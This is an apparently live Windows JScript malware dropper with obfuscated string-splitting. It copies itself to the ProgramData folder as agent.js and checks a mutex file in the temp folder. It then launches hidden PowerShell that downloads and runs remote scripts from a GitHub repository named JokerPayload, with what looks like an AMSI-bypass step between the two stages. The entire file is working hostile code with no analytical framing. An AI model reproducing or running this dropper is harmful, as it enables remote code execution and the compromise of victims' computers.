var f1="Scr",f2="ing.Fi",f3="stemOb"
var fso = new ActiveXObject(f1+"ipt"+f2+"leSy"+f3+"ject");
var w1="WSc",w2="riPt",w4="eLl"
var wsh=w1+w2+".sH"+w4
var bbj=new ActiveXObject(wsh)
var fldr=GetObject("winmgmts:root\\cimv2:Win32_Processor='cpu0'").AddressWidth==64?"SysWOW64":"System32"
var rd=bbj.ExpandEnvironmentStrings("%SYSTEMROOT%")+"\\"+fldr+"\\WindowsPowerShell\\v1.0\\powershell.exe"
if (WScript.ScriptName != "ag"+"ent.js") {
	var fs5="yFi"
	try {
	fso["Cop"+fs5+"le"](WScript.ScriptFullName, bbj.ExpandEnvironmentStrings("%programdata%")+"\\ag"+"ent.js");
	} catch (e) {}
}
var mtx_name="7z6F6P6HCJOS";
var mtx_file = bbj.ExpandEnvironmentStrings("%temp%")+"\\"+mtx_name;
var fs1="leteFi"
var fs2="leExis"
try {
	fso["De"+fs1+"le"](mtx_file);
} catch (e) {}
if (!fso["Fi"+fs2+"ts"](mtx_file))
{
	bbj.Run(rd+" -command \"$env:paths = '" + mtx_name + "'; IEX(IWR -UseBasicParsing 'https://raw.githubusercontent.com/wizard-projects/JokerPayload/main/agent1.ps1'); $f.SetValue($null, $true); IEX(IWR -UseBasicParsing 'https://raw.githubusercontent.com/wizard-projects/JokerPayload/main/agent3.ps1')\"", 0)
}
